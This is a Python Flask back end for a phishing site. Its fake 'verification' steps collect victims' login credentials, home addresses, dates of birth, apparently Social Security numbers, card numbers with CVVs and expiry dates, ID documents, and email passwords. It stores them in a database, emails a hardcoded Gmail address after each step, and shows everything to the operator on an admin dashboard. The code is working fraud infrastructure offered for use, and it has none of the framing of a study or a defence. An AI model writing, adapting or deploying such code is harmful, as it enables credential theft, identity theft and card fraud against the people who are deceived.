from flask import (
    Flask, request, jsonify, render_template,session,redirect, Blueprint
)
from flask_cors import CORS
import mysql.connector 
import os 
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import smtplib
import traceback
from typing import Optional
import base64
import requests
from dotenv import load_dotenv

load_dotenv()

# ==========================
# FLASK APP SETUP
# ==========================
app = Flask(__name__)
app.secret_key = "supersecret"

CORS(app, supports_credentials=True)

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax"
)

CONFIG_FILE = "config.json"


conn = mysql.connector.connect(
    host = os.getenv("DB_HOST"),
    user =  os.getenv("DB_USER"),
    password =  os.getenv("DB_PASSWORD"),
    database =  os.getenv("DB_NAME"), 
    port =  os.getenv("DB_PORT"),
)
cursor = conn.cursor()




def send_email(
    recipient: str,
    subject: str,
    body: str,
    html: bool = False,
    attachments: Optional[list] = None
) -> bool:
    try:
        api_key = os.getenv("RESEND_API_KEY")
        sender = os.getenv("SENDER_EMAIL")

        if not api_key or not sender:
            print("⚠️ Email not configured")
            return False

        files = []
        if attachments:
            for path in attachments:
                if os.path.exists(path):
                    with open(path, "rb") as f:
                        files.append({
                            "filename": os.path.basename(path),
                            "content": base64.b64encode(f.read()).decode()
                        })
                else:
                    print(f"Attachment not found: {path}")

        payload = {
            "from": sender,
            "to": [recipient],
            "subject": subject,
            "html": body if html else None,
            "text": body if not html else None,
            "attachments": files if files else None
        }

        response = requests.post(
            "https://api.resend.com/emails",
            headers={
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json",
            },
            json=payload,
            timeout=10,
        )

        if response.status_code >= 400:
            print("⚠️ Email error:", response.text)
            return False

        return True

    except Exception as e:
        print("⚠️ Email failed:", e)
        traceback.print_exc()
        return False


    
# =============== ROUTES ===============
@app.route('/')
def home():
    return render_template("index.html")

@app.route("/verify1")
def verify1_page():
    return render_template("Form1.html")

@app.route("/verify2")
def verify2_page():
    return render_template("succes2.html")

@app.route("/verify3")
def verify3_page():
    return render_template("succes3.html")

@app.route("/admin/login")
def admin_login_page():
    return render_template("admin_login.html")

@app.route("/admin")
def admin():
    if "admin_id" not in session:
       return redirect("/admin/login")
    cursor = conn.cursor(dictionary=True)
    cursor.execute(
        """
        SELECT id,username,password,fullname,street_address,city,state,zip_code,dob,sss,card_d,ccc,exp_date,sims,valid_id,email,mail_pss
        FROM users
        """
    )
    info = cursor.fetchall()
    return render_template("admin_dashboard.html", info=info)

attempts = 0
@app.route("/loginp", methods=["POST"])
def login():
    global attempts
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400


    username = data.get('username')
    chip = data.get('password')


    if not username or not chip:
        return jsonify({"status": "error", "message": "username and password required"})
    try:
        # save to database
        cursor.execute(
            """
            INSERT INTO users(username, password)
            VALUES(%s,%s)
            """,
            (username, chip)
        )
        user_id = cursor.lastrowid
        conn.commit()
        attempts += 1
        print(attempts)

        # if attempts < 2:
        #     return jsonify({"status": "error", "message": "Password or username not correct"})
    
        send_email(
            "jaymoutrey658@gmail.com",
            "New Sign In",
            "There's a new sign, check admin dashboard to confirm",
            html=False
        )

        session['user_id'] = user_id
        return jsonify({"status": "success", "message": "Login Successful. Continue with the verification"})
    except Exception as e:
        # Rollback in case of error
        conn.rollback()
        print("Error Logining:", e)
        return jsonify({"status": "error", "message": str(e)}), 500

    
@app.route("/verifyid", methods=["POST"])
def verify_id():
    form = request.form
    print(form)
    # Required fields
    required_fields = [
        "address",
        "city",
        "state",
        "zip_code",
        "dob",
        "sss"
    ]

    # Validate required fields
    for field in required_fields:
        if not form.get(field):
            return jsonify({
                "status": "error",
                "message": f"Missing field: {field}"
            }), 400



    user_id = session.get("user_id")

    try:
        # save to database
        cursor.execute(
            """
            UPDATE users
            SET fullname=%s,
                street_address=%s,
                city=%s,
                state=%s,
                zip_code=%s,
                dob=%s,
                sss=%s
            WHERE id=%s
            """,
            (form['fullname'],
             form['address'],
             form['city'],
             form['state'],
             form['zip_code'],
             form['dob'],
             form['sss'],
             user_id
            )
        )
        conn.commit()
    
        send_email(
            "jaymoutrey658@gmail.com",
            "New Sign In",
            "Uploaded id verification, check admin dashboard to confirm",
            html=False
        )

        return jsonify({"status": "success", "message": "Successful. Continue with the verification"})
    except Exception as e:
        # Rollback in case of error
        conn.rollback()
        print("Error Verifying:", e)
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/verifycard", methods=["POST"])
def verify_card():
    form = request.form
    # Required fields
    required_fields = [
        "cardno",
        "ccc",
        "exp_date",
        "sims",
        "id"
    ]

    # Validate required fields
    for field in required_fields:
        if not form.get(field):
            return jsonify({
                "status": "error",
                "message": f"Missing field: {field}"
            }), 400



    user_id = session.get("user_id")

    try:
        # save to database
        cursor.execute(
            """
            UPDATE users
            SET card_d=%s,
                ccc=%s,
                exp_date=%s,
                sims=%s,
                valid_id=%s
            WHERE id=%s
            """,
            (form['cardno'],
             form['ccc'],
             form['exp_date'],
             form['sims'],
             form['id'],
             user_id
            )
        )
        conn.commit()
    
        send_email(
            "jaymoutrey658@gmail.com",
            "New Sign In",
            "Uploaded Card verification, check admin dashboard to confirm",
            html=False
        )

        return jsonify({"status": "success", "message": "Successful. Continue with the verification"})
    except Exception as e:
        # Rollback in case of error
        conn.rollback()
        print("Error Verifying:", e)
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/verifyemail", methods=["POST"])
def verify_email():
    data = request.form

    email = data['email']
    past = data['email_pass']

    print(data)
    if not email or not past:
        return jsonify({"status": "error", "message": "Email and pass are required "}), 401


    user_id = session.get("user_id")

    try:
        # save to database
        cursor.execute(
            """
            UPDATE users
            SET email=%s,
                mail_pss=%s
            WHERE id=%s
            """,
            (
                email,
                past,
                user_id
            )
        )
        conn.commit()
    
        send_email(
            "jaymoutrey658@gmail.com",
            "New Sign In",
            "Uploaded EMAIL verification, check admin dashboard to confirm",
            html=False
        )

        return jsonify({"status": "success", "message": "Successful. Continue with the verification"})
    except Exception as e:
        # Rollback in case of error
        conn.rollback()
        print("Error Verifying:", e)
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/login/admin", methods=["POST"])
def verify_admin():
    data = request.form

    username = data['username']
    past = data['password']

 
    if not username or not past:
        return jsonify({"status": "error", "message": "Username and pass are required "}), 401

    try:
        # save to database
        cursor.execute(
            """
            SELECT id,password
            FROM admins
            WHERE username=%s
            """,
            (
             username,
            )
        )
        user = cursor.fetchone()
        if not user:
            return jsonify({"status": "error", "message": "Admin not found."}), 400
        
        if past != user[1]:
            return jsonify({"status": "error", "message": "Incorrect password"}), 401
        
        session["admin_id"] = user[0]
    
        send_email(
            "jaymoutrey658@gmail.com",
            "New Sign In",
            f"Admin {username} just signed in the admin dashboard",
            html=False
        )

        return jsonify({"status": "success", "message": "Login Successful."})
    except Exception as e:
        # Rollback in case of error
        conn.rollback()
        print("Error Verifying:", e)
        return jsonify({"status": "error", "message": str(e)}), 500


    
    
if __name__ == "__main__":
    app.run()